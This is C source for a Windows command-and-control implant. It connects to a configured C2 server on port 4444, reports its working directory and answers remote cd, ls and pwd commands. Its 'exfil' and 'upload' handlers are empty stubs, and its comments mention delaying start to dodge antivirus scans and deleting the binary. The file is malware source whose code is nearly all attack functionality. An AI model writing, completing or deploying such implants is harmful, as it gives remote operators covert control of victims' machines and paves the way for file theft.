#include "c2_net.h"
#include <windows.h>
#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Pathcch.lib")

// Configurations
#define SLEEP 1
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 4444

SOCKET c2_sock;

// Present working directory, globally accessible
char pwd[MAX_PATH + 1] = {0};
 

// Attempt to change the pwd to the given path. Returns FALSE if path does not exist.
BOOL change_dir(char *path, int len) {

    // Absolute path
    if(len >= 3 && path[1] == ':' && PathIsDirectoryA(path)) {
        memset(pwd, 0, _MAX_PATH + 1);
        strncpy(pwd, path, len);
        PathAddBackslashA(pwd); // Append trailing \ to path if needed
        return TRUE;
    }
    // No support for relative paths
    return FALSE;
}

// Write file + directory listing to out
DWORD ls(char *path, char* out) {
    char preparedPath[MAX_PATH];
    LARGE_INTEGER file_size;
    WIN32_FIND_DATA data;
    BOOL status = 0;
    int len = 0;
    
    // Copy the string to a buffer+ append '\*' to the directory name
    sprintf(preparedPath, "%s\\*", path);
    
    // Find first file
    HANDLE h = FindFirstFileA(preparedPath, &data);
    if (h == INVALID_HANDLE_VALUE) {
        return -1;
    }

    // Loop through rest of files
    do {
        char* name = data.cFileName;        
        
        // Directory
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            len += sprintf((char*) out + len, "DIR     %s\n", name);
        }
        // File
        else {
            file_size.LowPart = data.nFileSizeLow;
            file_size.HighPart = data.nFileSizeHigh;
            len += sprintf((char*) out + len, "FILE    %s \t %lld\n", name, file_size.QuadPart);
        }

        status = FindNextFileA(h, &data);
    } while (status != 0);
    FindClose(h);

    if (status == 0 || status == ERROR_NO_MORE_FILES)
        return 0;
    return -1;
}

// cl implant.c c2_net.c /Fe:implant.exe /DDEBUG
// cl implant.c c2_net.c /Fe:implant.exe
int main() {
    int status = 0;
    int len = 0;
    char buffer[512];


    // Sleep on start to avoid AV scans
    Sleep(SLEEP * 1000);

    // Basic setup
    if (!setup_comms()) {
        return 1;
    }

    // Connect to C2 server (TODO: what to do if can't connect?)
    c2_sock = c2_connect(SERVER_IP, SERVER_PORT);
    if (c2_sock == INVALID_SOCKET) {
        closesocket(c2_sock);
        WSACleanup();
        return 1;
    }

    // Get present directory
    GetCurrentDirectory(_MAX_PATH, pwd);
    c2_send(c2_sock, pwd, strlen(pwd));

    
    while (TRUE) {
        // Get data
        len = c2_recv(c2_sock, buffer, 511);
        if (len == SOCKET_ERROR)
            continue;
        c2_log("%s\n", buffer);

        // Main logic of implant functionality
        if (strncmp(buffer, "exit", 4) == 0) {
            break;
        }
        else if(strncmp(buffer, "cd ", 3) == 0 && len >= 4) {
            if (! change_dir(buffer + 3, len - 3)) // buffer + 3 is start of arg passed to cd
                c2_send(c2_sock, "Invalid dir", 11);
        }
        else if(strncmp(buffer, "ls", 2) == 0) {
            char listing[4096] = {0};
            if (len == 2)
                status = ls(pwd, listing);
            else if (len >= 4)
                status = ls(buffer + 3, listing); // arg passed to ls

            // Check result
            if (status == 0) {
                c2_send(c2_sock, listing, strlen(listing));
            }
            else {
                c2_send(c2_sock, "ERROR", 5);
            }
        }
        else if(strncmp(buffer, "pwd", 2) == 0) {
            c2_send(c2_sock, pwd, strlen(pwd));
        }
        else if(strncmp(buffer, "exfil ", 5) == 0) {
            
        }
        else if(strncmp(buffer, "upload ", 6) == 0) {
            
        }
        // TODO: what else?

        

    }

    // Close the socket
    closesocket(c2_sock);
    WSACleanup();
    return 0;
    // TODO: delete binary?
}
